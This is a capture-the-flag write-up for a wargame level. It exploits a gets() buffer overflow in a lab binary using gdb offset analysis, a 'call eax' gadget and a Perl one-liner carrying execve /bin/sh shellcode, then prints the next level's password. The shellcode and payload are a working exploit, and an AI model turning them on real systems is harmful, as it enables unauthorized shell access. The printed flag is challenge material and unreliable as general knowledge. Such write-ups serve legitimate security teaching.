# level3

In this level, we have an executable. This executable wait for a string with gets.

Let's try to do a buffer overflow
```bash
(gdb) pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
(gdb) run
...
; segfault
(gdb) pattern search
Registers contain pattern buffer:
EIP+0 found at offset: 80  ; <-- this one is usefull, this is the offset of eip from the string in gets
EBP+0 found at offset: 76
Registers point to pattern buffer:
[EAX] --> offset 0 - size ~100
[EDX] --> offset 0 - size ~100
[ESP] --> offset 84 - size ~16
Pattern buffer found at:
0x0804a04b : offset   67 - size   33 ([heap])
0xb7fd9043 : offset   67 - size   33 (mapped)
0xb7fda000 : offset    0 - size  100 (mapped)
0xbffff68f : offset   67 - size   33 ($sp + -0x11 [-5 dwords])
References to pattern buffer found at:
0xb7fd1acc : 0xb7fda000 (/lib/i386-linux-gnu/libc-2.15.so)
0xb7fd1ad0 : 0xb7fda000 (/lib/i386-linux-gnu/libc-2.15.so)
0xb7fd1ad4 : 0xb7fda000 (/lib/i386-linux-gnu/libc-2.15.so)
0xb7fd1ad8 : 0xb7fda000 (/lib/i386-linux-gnu/libc-2.15.so)
0xb7fd1adc : 0xb7fda000 (/lib/i386-linux-gnu/libc-2.15.so)
```

Ok now we will send a shellcode to open shell. we will put the shellcode in the string and then call it.

The function gets return the string (in `eax`). To call it, we have to find a `call eax` in the executable
```bash
> objdump -d level2 | grep call
 804835c:       e8 00 00 00 00          call   8048361 <_init+0x9>
 8048372:       e8 89 00 00 00          call   8048400 <__gmon_start__@plt>
 8048377:       e8 34 01 00 00          call   80484b0 <frame_dummy>
 804837c:       e8 4f 02 00 00          call   80485d0 <__do_global_ctors_aux>
 804843c:       e8 cf ff ff ff          call   8048410 <__libc_start_main@plt>
 8048488:       ff 14 85 50 97 04 08    call   *0x8049750(,%eax,4)
 80484cf:       ff d0                   call   *%eax       ; <-- there is a call to eax here: get his address (80484cf)
 80484e2:       e8 c9 fe ff ff          call   80483b0 <fflush@plt>
 80484ed:       e8 ce fe ff ff          call   80483c0 <gets@plt>
 8048516:       e8 85 fe ff ff          call   80483a0 <printf@plt>
 8048522:       e8 a9 fe ff ff          call   80483d0 <_exit@plt>
 804852d:       e8 be fe ff ff          call   80483f0 <puts@plt>
 8048538:       e8 a3 fe ff ff          call   80483e0 <strdup@plt>
 8048545:       e8 8a ff ff ff          call   80484d4 <p>
 8048554:       e8 69 00 00 00          call   80485c2 <__i686.get_pc_thunk.bx>
 804856c:       e8 e7 fd ff ff          call   8048358 <_init>
 804859b:       ff 94 b3 20 ff ff ff    call   *-0xe0(%ebx,%esi,4)
 80485eb:       ff d0                   call   *%eax
 8048600:       e8 00 00 00 00          call   8048605 <_fini+0x9>
 804860c:       e8 3f fe ff ff          call   8048450 <__do_global_dtors_aux>
```
print this string in a file
```bash
# print "shellcode + offset(80-size(shellcode)) + address to call eax
> perl -e 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" . "\x90"x(80-28) . "\xcf\x84\x04\x08"' > /tmp/args
```
then call the program with the file
```bash
> cat /tmp/args - | ./level2
# a /bin/sh is open
> cd ../level3
> cat .pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

